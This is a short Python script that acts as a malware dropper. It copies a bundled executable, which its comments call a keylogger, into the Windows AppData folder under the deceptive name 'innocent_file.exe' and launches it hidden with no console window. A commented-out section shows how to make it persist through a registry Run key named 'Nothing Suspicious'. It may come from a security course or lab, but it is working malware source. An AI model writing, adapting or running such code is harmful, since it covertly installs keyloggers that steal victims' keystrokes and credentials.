# import winreg
import sys
import os
import pathlib
import shutil
import subprocess

base = pathlib.Path(getattr(sys, '_MEIPASS', pathlib.Path(__file__).parent))

# ------------- INITIALISE WORKING DIRECTORY IN TARGET SYSTEM -----------------
copy_directory = pathlib.Path(os.path.join(os.getenv("APPDATA"), "LegitFolder"))
executable_path = copy_directory / "innocent_file.exe"

# Make the specified directory. If it doesn't exist, 
try:
    os.mkdir(copy_directory)
except FileExistsError:
    pass

# ----------------- COPY FILES INTO WORKING DIRECTORY ------------------------
shutil.copy2(base / "MailService.exe", executable_path) # Keylogger

# ------------ CREATE WINDOWS REGISTRY KEY FOR PERSISTENCE -------------------
# key_path = winreg.HKEY_CURRENT_USER

# # In an actual attack, "RunOnce" will be replaced with "Run"
# try:
#     sub_key = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
#     key = winreg.CreateKey(key_path, sub_key)
#     winreg.SetValueEx(key, "Nothing Suspicious", 0, winreg.REG_SZ, os.path.abspath(executable_path))
#     winreg.CloseKey(key)
# except Exception as e:
#     print(e)

# ------------------------------ RUN KEYLOGGER ------------------------------
subprocess.Popen([executable_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)